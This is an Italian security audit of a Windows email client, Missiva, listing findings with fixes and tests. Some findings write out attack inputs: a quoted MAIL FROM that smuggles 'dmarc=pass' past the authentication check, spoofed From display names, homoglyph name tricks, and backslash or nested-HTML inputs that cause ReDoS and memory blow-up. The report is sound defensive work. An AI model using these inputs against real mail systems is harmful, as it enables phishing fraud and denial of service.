  case "dmarc": dmarc ??= value; break;
  ```

- Scenario: chi manda dal proprio server con `MAIL FROM:<"a;dmarc=pass"@dominio-ostile.example>` (SPF valido) e `From:
  avvisi@banca.example` fa scrivere al server della casella `...; spf=pass smtp.mailfrom="a;dmarc=pass"@...; dmarc=fail
  header.from=banca.example`. Lo split produce il pezzo `dmarc=pass"@...` prima del `dmarc=fail` vero: `Dmarc` diventa
  "pass" e la fascia rossa sparisce. (Ho trascritto `Parse`/`Failed` in un piccolo programma a parte: con l'intestazione
  costruita cosi il risultato e `pass`, senza fascia; con una normale e `fail`, con fascia.)
- Gravita: Media. Spegne la protezione principale contro le frodi; servono un server proprio e un dominio con DMARC
  `p=none`/`quarantine`.
- Stato: difetto di parsing CONFERMATO; SOSPETTO che un server reale accetti e riscriva cosi un local-part fra virgolette.
- Proposta: dividere i risultati rispettando le stringhe fra virgolette (RFC 8601); leggere il metodo solo dal primo
  `nome=` di ogni risultato, non dentro le proprieta (`smtp.mailfrom=`, `header.from=`); con piu `dmarc=` diversi, valere
  il peggiore.
- Verifica su Windows: in `--prova-bozze` accanto ai controlli di `SenderCheck`, aggiungere l'intestazione costruita qui
  sopra e un caso con due `dmarc=` diversi.

### S-24 La fascia gialla "nome di un contatto" (LookAlike) e aggirabile

- Dove: `Core/AddressBook.cs:255-256,263-265` (`LookAlike`: il nome si confronta tale e quale; esclusione dei nomi con
  "@"; `SameOrganization` sul dominio).
- Scenario: (a) col contatto noto `Mario Rossi <mario.rossi@posta-gratuita.example>`, un messaggio da `Mario Rossi
  <mario.rossi.studio@posta-gratuita.example>` non da fascia, perche lo stesso dominio di posta personale vale come
  "stessa organizzazione": e la frode BEC piu comune, e `Settings.ImageKey` sa gia distinguere la posta personale.
  (b) uno spazio a larghezza zero o un omoglifo nel nome saltano il confronto (`MailHtml.Invisible()` esiste ma non si usa
  sui nomi).
- Gravita: Media (l'aggiramento (a) non richiede trucchi).
- Stato: CONFERMATO.
- Proposta: confrontare con la chiave di `Settings.ImageKey` (per la posta personale l'indirizzo intero, non il dominio);
  normalizzare i nomi (NFKC, togliere gli invisibili, comprimere gli spazi, scheletro per gli omoglifi).
- Verifica su Windows: `--prova-bozze` con un contatto noto e un mittente dallo stesso dominio personale ma indirizzo
  diverso: `LookAlike` deve restituire l'indirizzo noto.

### S-25 Un nome mostrato che contiene un indirizzo diverso non da nessun avviso, e l'indirizzo vero si nasconde

- Dove: `Core/Models.cs:113` (`Display => Name.Length > 0 ? Name : Email`), `UI/ViewModels.cs:670` (elenco),
  `UI/App.cs:833` (notifica), `UI/ReadingPage.cs:155-156,587-588` (riquadro: l'indirizzo `<...>` solo se espanso, e il
  CSS accorcia l'indirizzo, non il nome), `Core/AddressBook.cs:256` (i nomi con "@" non si controllano).
- Scenario: `From: "assistenza@banca.example" <x@dominio-ostile.example>`. Elenco, notifica e messaggi chiusi mostrano
  solo "assistenza@banca.example"; nel riquadro il nome non si accorcia e l'indirizzo vero si, fino a sparire se il nome
  e lungo. Nessuna fascia scatta.
- Gravita: Media (e il travestimento piu comune).
- Stato: CONFERMATO dal codice; l'effetto del CSS (indirizzo a larghezza zero) ricavato leggendo, non misurato.
- Proposta: se il nome contiene un indirizzo diverso da quello vero, fascia gialla e, in elenco/notifica, mostrare
  l'indirizzo vero; nel CSS non accorciare l'indirizzo; togliere i caratteri bidi/invisibili dai nomi mostrati.
- Verifica su Windows: `--prova-bozze` su `SenderCheck.Of` dopo la correzione; `--page --headers` con un From cosi,
  fotografato a 420 DIP.

### S-26 Dati personali in chiaro in `impostazioni.json`

- Dove: `Core/Store.cs` - `Accounts` (indirizzi, nomi, tenant, server IMAP, UserName, identita), `ImageSenders`
  (indirizzi interi dei mittenti personali con immagini consentite), `HiddenCalendars` (gli id dei calendari Google sono
  indirizzi), `FolderOrder`/`Favorites`/`FolderColors` (per Gmail e IMAP l'id della cartella e il percorso, es.
  `Clienti/Rossi/Causa`), `LocalCategories`, `Signatures` (`Signature.Rtf`: nome, telefono, a volte IBAN).
- Scenario: chi ottiene una copia del file (backup, sincronizzazione, assistenza) vede con chi ci si scrive e come sono
  organizzati clienti e pratiche. Incoerente con le regole e i modelli, gia cifrati (`ProtectedTextConverter`).
- Gravita: Bassa.
- Stato: CONFERMATO.
- Proposta: `ProtectedTextConverter`/`ProtectedListConverter` anche per firme, `ImageSenders`, chiavi delle mappe di
  cartelle, categorie e calendari (un convertitore che cifra la mappa intera).
- Verifica su Windows: `--prova-bozze` che serializza Settings con una cartella `Clienti/Rossi` e una firma con IBAN e
  controlla che il JSON non le contenga.

### S-27 I nomi dei file e il registro rivelano i corrispondenti

- Dove: `Core/SenderLogos.cs:40-41` (`loghi\<dominio>.png`/`.none`), `UI/NotificationAvatar.cs:26`
  (`notifiche\<colore>-<iniziali>.png`); registro installato: `UI/ReadingView.xaml.cs:1339` (`anteprima di
  {attachment.Name}`), `UI/P7mWindow.cs:109` (`file firmato {result.Name}`), `Core/GmailProvider.Calendar.cs:96` (nome
  del calendario), `Core/MicrosoftAuth.cs:136` (client e autorita), `Core/Store.cs` (`Log.Error` scrive l'eccezione
  intera, che puo contenere il testo d'errore del server SMTP/IMAP con indirizzi), piu gli indirizzi degli account in
  molte righe.
- Scenario: `loghi\` elenca le aziende che scrivono (banca, ospedale, studio); il registro "si manda a chi aiuta" e
  `Log.Private` nasconde gli oggetti, ma "Referto_Rossi.pdf" dice altrettanto. `domini.dat` invece e cifrato.
- Gravita: Bassa.
- Stato: CONFERMATO le righe; SOSPETTO il contenuto dei testi d'errore dei server.
- Proposta: nome del file = SHA-256 troncato del dominio/iniziali; `Log.Private` per nomi di allegati e calendari;
  per `Log.Error` nella versione installata, tipo ed eccezioni senza `Message` dei comandi SMTP/IMAP, o pulizia degli
  indirizzi.
- Verifica su Windows: `grep` di `@` e `.pdf` nel `missiva.log` di una Release di prova dopo un'anteprima e un invio
  rifiutato.

### S-28 Allegati temporanei in `%TEMP%\Missiva` per tutta la sessione

- Dove: `Core/Safety.cs:82-97` (`CleanTemp`), chiamata solo all'avvio (file piu vecchi di 1 giorno) e all'uscita
  (`UI/App.cs`).
- Scenario: di base Missiva resta nell'area di notifica, anche per settimane; ogni allegato aperto resta in chiaro in
  `%TEMP%` fino all'uscita.
- Gravita: Bassa (cartella dell'utente).
- Stato: CONFERMATO.
- Proposta: ripetere `CleanTemp(TimeSpan.FromHours(1))` dal timer di ogni minuto gia esistente.

---

## Contenuti ostili nei parser (E)

### S-29 ReDoS: `CssEscapedFunction` ha costo quasi cubico, un'email blocca Missiva per minuti

- Dove: `Core/MailHtml.cs:389` (l'espressione `CssEscapedFunction`), usata in `Css` (`:399`) solo quando il CSS contiene
  un backslash.

  ```
  [GeneratedRegex(@"(?:[-\w]|\\[0-9a-fA-F]{1,6}\s?|\\[^\r\n0-9a-fA-F])*\\(?:[0-9a-fA-F]{1,6}\s?|[^\r\n0-9a-fA-F])(?:[-\w]|...)*\(")]
  ```

- Scenario: un'email con molti backslash nel CSS (in un `<style>` o in uno `style=`) fa esplodere il backtracking. Ho
  misurato l'espressione isolata su una stringa di soli backslash: 250 -> 67 ms, 500 -> 473 ms, 1000 -> 2.529 ms,
  2000 -> 18.993 ms (MISURATO, .NET 10, Xeon 4 vCPU). Ogni raddoppio della lunghezza moltiplica il tempo per ~7-8:
  andamento ~n^2.9. Con qualche decina di migliaia di backslash il thread che pulisce l'HTML resta fermo per minuti o
  ore. La pulizia parte in sottofondo (`ReadingPage.Warm`), ma l'apertura la aspetta, e con "Mostra immagini", cambio
  tema o `Render` succede sul thread dell'interfaccia.
- Gravita: Alta (per un parser: un singolo messaggio nega il servizio; e il piu grave fra i reperti di contenuto ostile).
- Stato: CONFERMATO (lettura) e MISURATO (espressione isolata).
- Proposta: riscrivere l'espressione senza ripetizioni annidate che possono sovrapporsi (per esempio cercare la sequenza
  di escape con un automa lineare, o `RegexOptions.NonBacktracking`), oppure togliere del tutto questa normalizzazione e
  affidarsi al blocco strutturale. In ogni caso applicare un limite di dimensione/tempo alla pulizia del CSS.
- Verifica su Windows: `--prova-bozze` che chiama `MailHtml.Prepare` su un'email con `style="\\\\...(50.000 volte)"` e
  misura il tempo (deve restare sotto qualche decina di ms).

### S-30 Blow-up di `Prepare` su HTML patologici: allocazioni enormi e costo super-lineare con l'annidamento

- Dove: `Core/MailHtml.cs:48` (`ParseDocument`, AngleSharp), `:56` (`dom.All.ToList()`), `:71` (per ogni elemento, nel
  tema scuro, risale **tutta** la catena di antenati: `for (var p = e; p != null && !keepText; p = p.ParentElement)
  keepText = vivid.Contains(p);`).
- Scenario (MISURATO, .NET 10, immagini non consentite):
  - 100.000 `<` di fila: ~2,8 s e **9,5 GB allocati** per una chiamata (AngleSharp); un'email simile puo esaurire la
    memoria.
  - div annidati, tema scuro: 2.000 -> ~0,2 s, 4.000 -> 0,12 s, 8.000 -> 0,37 s (il caso "tag mai chiusi" con 20.000 div
    annidati: ~7-9 s). Il ramo scuro e circa il doppio del chiaro per la risalita degli antenati (`:71`), che su una
    catena profonda e O(profondita) per elemento, cioe O(n^2).
  - Le email normali restano lineari e veloci (vedi il rapporto di velocita): 50 KB ~25 ms, 1 MB ~206 ms scuro. Il
    problema e solo con gli input costruiti.
- Gravita: Media (serve un'email costruita; il thread che pulisce si blocca e la memoria puo esaurirsi).
- Stato: CONFERMATO (lettura) e MISURATO (andamento).
- Proposta: un limite di dimensione dell'HTML prima di `ParseDocument` (per esempio 8-10 MB) e un limite di profondita/di
  numero di nodi; per la risalita `vivid`, calcolare l'ereditarieta una volta sola scendendo l'albero invece di risalire
  per ogni elemento.
- Verifica su Windows: `--prova-bozze` con i tre input e un tetto di tempo e di memoria.

### S-31 Gli altri parser sono robusti

Misurati e letti, senza costi anomali: `Invitation.Parse` di un .ics da 256 KB ~6 ms (il `ParseLine` a passata singola e
i limiti `MaxLength`/`MaxLines`/`MaxHead` tengono; l'.ics piegato in migliaia di pezzi ~3 ms), `ContactFiles.VCard` 5000
contatti ~65 ms e 5 MB quoted-printable ~24 ms, `ContactFiles.Csv` 5000 ~13 ms, `SenderCheck.Parse` 50.000 campi ~36 ms
(lineare), `Pec`/`P7m` con `DtdProcessing.Prohibit` e limiti di annidamento. Tutte le altre espressioni di `MailHtml` e
`Invitation` provate con ingressi lunghi sono lineari (`ColorToken`, `ColorDeclaration`, `CssImageSet`, `UrlInText`,
`WebAddress`, `CutEntity`, `RootSelectors`: tutte sotto 10 ms). Stato: MISURATO.

---

## Installazione (F)

### S-32 `installa.ps1`/`disinstalla.ps1` e NuGet: a posto, con un residuo

I percorsi sono fra virgolette e il blocco del registro e coerente fra installa e disinstalla (ProgID, Capabilities,
Run). `app.manifest` chiede `requestedExecutionLevel asInvoker` e DPI-aware. Residuo gia citato: `disinstalla.ps1` non
toglie la voce ACL che `Sandbox.GrantRead` aggiunge all'AppContainer sulla cartella dell'eseguibile (S-13). Sui pacchetti
NuGet con vulnerabilita note su un percorso usato davvero: non ho un elenco di avvisi eseguibile da qui (`dotnet list
package --vulnerable` richiede la rete del ripristino); i pacchetti sono recenti (AngleSharp 1.8.2, MailKit 4.18.0,
MSAL 4.90, WebView2 1.0.4191, SharpVectors 1.8.6). SharpVectors e il punto debole, ma per come viene usato (S-01), non
per una CVE nota. Da rifare sul PC dell'autore con `dotnet list package --vulnerable --include-transitive`. Gravita Bassa,
SOSPETTO (manca l'elenco degli avvisi).

---

## Tabella riassuntiva (per gravita)

| Sigla | Titolo | Gravita | Stato |
|---|---|---|---|
| S-01 | SVG delle icone: `SafeSvg` aggirabile, SharpVectors carica risorse esterne (SSRF/NTLM) | Alta | CONFERMATO (Missiva) / SOSPETTO (SharpVectors) |
| S-29 | ReDoS quasi cubico in `CssEscapedFunction`: un'email blocca Missiva | Alta | CONFERMATO + MISURATO |
| S-02 | Icone raster decodificate con WIC automatico, senza limite di misure | Media | CONFERMATO |
| S-03 | Loghi: richieste di rete alla visualizzazione dell'elenco (conferma di lettura) | Media | CONFERMATO |
| S-04 | Logo mostrato senza verificare DMARC (From falsificato) | Media | CONFERMATO |
| S-23 | `Authentication-Results`: `;` fra virgolette toglie la fascia rossa | Media | CONFERMATO (parsing) / SOSPETTO (server) |
| S-24 | Fascia "nome di un contatto" aggirabile (stesso dominio personale, omoglifi) | Media | CONFERMATO |
| S-25 | Nome mostrato con indirizzo diverso: nessun avviso, indirizzo vero nascosto | Media | CONFERMATO |
| S-30 | Blow-up di `Prepare` su HTML patologici (9,5 GB, O(n^2) annidamento) | Media | CONFERMATO + MISURATO |
| S-05 | Link con host ideografico tenuto senza normalizzazione IDN | Bassa | CONFERMATO |
| S-06 | Gettone della pagina in attributi leggibili dal CSS (difesa in profondita) | Bassa | CONFERMATO (oggi non si legge, MISURATO) |
| S-08 | Profilo WebView2 persistente: cache/cookie in chiaro | Bassa | SOSPETTO |
| S-09 | Nomi allegati: caratteri bidi non rimossi, mostrato != salvato | Bassa | CONFERMATO |
| S-10 | Marchio web assente su Salva .eml/PDF; errore non ferma l'apertura | Bassa | CONFERMATO |
| S-11 | `Dangerous`: mancano `.one`/`.psm1` (i macro-doc no) | Bassa | CONFERMATO |
| S-12 | Processo PDF: risposte non validate | Bassa | CONFERMATO / SOSPETTO (Windows.Data.Pdf) |
| S-13 | AppContainer PDF: ambiente ereditato, job non obbligatorio, GrantRead largo | Bassa | CONFERMATO |
| S-15 | `HtmlToFlow`: immagine "di Missiva" dal solo suffisso cid | Bassa | CONFERMATO |
| S-16 | `IsPublic`: lacune IPv6/IPv4 speciali; proxy non considerato | Bassa | CONFERMATO / SOSPETTO |
| S-17 | BIMI: `l=` non confrontato col VMC, logo senza scadenza | Bassa | CONFERMATO |
| S-19 | Autoconfig: DTD accettate; ISPDB dal MX senza conferma `Foreign` | Bassa | CONFERMATO |
| S-21 | Notifiche: `reply` invia senza finestra, non limitato ai notificati | Bassa | CONFERMATO (Missiva) |
| S-22 | Canale con nome: lettura illimitata, `AllowSetForegroundWindow(-1)` | Bassa | CONFERMATO / SOSPETTO |
| S-26 | Dati personali in chiaro in `impostazioni.json` | Bassa | CONFERMATO |
| S-27 | Nomi file (loghi) e registro rivelano i corrispondenti | Bassa | CONFERMATO |
| S-28 | Temporanei degli allegati per tutta la sessione | Bassa | CONFERMATO |
| S-32 | NuGet vulnerabili da ricontrollare sul PC | Bassa | SOSPETTO |

## Guardato e trovato a posto

- CSP e doppio blocco delle risorse esterne: 40+ email ostili, nessuna richiesta con immagini non consentite (MISURATO).
- Cornice: `position:fixed`, `:host !important` e div a schermo intero restano dentro `.content` (MISURATO).
- Popover dichiarativo (`popovertarget`, `command=show-popover`) inerte con JS spento (MISURATO).
- `ExecuteScriptAsync`: anteprime serializzate con `JsonSerializer` (`UI/ReadingView.xaml.cs:431`); testi dell'email
  sempre `HtmlEncode` in `ReadingPage`.
- Impostazioni di WebView2: script, dialoghi, host objects, web messages, autofill, password, download e permessi spenti
  (`UI/ReadingView.xaml.cs:931-953`); pagina servita con `Cache-Control: no-store` (`:1111`).
- Schemi dei link: solo http/https/mailto; `file:`/`ms-*`/UNC mai aperti (`:1513-1529`); azioni solo col gettone della
  pagina mostrata (`:1116-1140`).
- Nomi file da dati del server: SHA-256 per `MailCache`/`BodyCache`, GUID dell'account per calendario/contatti, dominio
  filtrato `[a-z0-9.-]` per i loghi: nessun attraversamento di cartelle.
- TLS di IMAP/SMTP: solo `SslOnConnect`/`StartTls`; callback che accetta un'impronta fissa solo in `#if DEBUG`; in
  Release il controllo predefinito di MailKit.
- Ganci di prova (`UseTestHandler`, `TestPort`, `TestPlain`, `TestRoots`, `TestToken`, `--page`, `--prova-bozze`,
  `--imap-finto`, `MISSIVA_IMAP_FINTO`, ...): tutti dentro `#if DEBUG`; `TestingProvider`, `MISSIVA_DATA`,
  `MISSIVA_NO_READ`, `--pdf-worker`, `--nascosta`, `-ToastActivated`/mailto: dentro `#if DEBUG || PROVA` o innocui in
  Release. Nella Release normale restano solo gli interruttori d'aspetto senza `#if`
  (`MISSIVA_SENZA_SOSPENSIONE`/`SENZA_STALL`/`RIGA_VECCHIA`) e gli argomenti legittimi (`--pdf-worker`, `--nascosta`,
  `mailto:`).
- Mailto: solo `to/cc/bcc/subject/body`, niente `attach`/`from`/intestazioni; testo come testo; niente invio automatico.
- `GoogleAuth`/`MicrosoftAuth`: PKCE S256, `state` casuale, risposta 404 senza state, segreti e token cifrati con DPAPI,
  `CheckChosen` dopo ogni finestra.
- `SenderLogos` rete: `ConnectCallback` sull'IP gia controllato, redirect limitati e ricontrollati, https->http non
  seguito, tempi e dimensioni limitati, niente cookie, VMC validato.
- `p7m`/PEC: buste annidate e dimensioni limitate, `DtdProcessing.Prohibit`, `XmlResolver=null`.
- Il contenuto del parser (vCard/CSV/ICS/SenderCheck): robusto e lineare (MISURATO).
- `IsPublic`: IPv4 privati, loopback, link-local, CGNAT, `0/8`, multicast, `240/4`, broadcast; IPv6 `::1`, `::`,
  fe80::/10, fec0::/10, fc00::/7, ff00::/8 (tranne le lacune di S-16).

## Non guardato

- Il comportamento a runtime, non eseguibile da qui: SharpVectors 1.8.6, WIC e i codec installati, WebView2 reale
  (differenza con Chromium headless), MsalCacheHelper, MailKit (callback predefinito dei certificati), Windows.Data.Pdf
  (numero di pagine), i limiti UI reali dell'AppContainer, i nomi riservati sulle varie versioni di Windows.
- Il codice interno delle librerie: registrazione COM e codifica degli argomenti delle notifiche
  (Microsoft.Toolkit.Uwp.Notifications), codifica delle intestazioni di MimeKit, `CurrentUserOnly` di .NET verso integrita
  bassa e AppContainer.
- Il comportamento dei server veri: local-part fra virgolette in Gmail, ordine di `internetMessageHeaders` di Graph,
  riscrittura delle intestazioni da parte di Exchange Online, server IMAP che aggiungono in fondo.
- `dotnet list package --vulnerable` (richiede il ripristino in rete).
- Le circa 400 righe del registro una per una (campionate con grep).
